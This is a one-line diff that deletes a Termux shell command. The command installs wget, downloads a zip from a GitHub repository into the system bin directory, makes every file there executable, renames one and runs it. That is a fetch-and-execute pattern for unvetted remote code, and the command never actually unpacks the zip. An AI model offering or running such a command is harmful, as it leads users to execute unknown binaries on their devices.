@@ -1,1 +1,0 @@
-clear && cd $HOME && cd /data/data/com.termux/files/usr/bin/ && pkg install wget -y && wget https://github.com/Tuanhung007/psithon/raw/main/v3.zip && chmod +x * && mv mod a && a
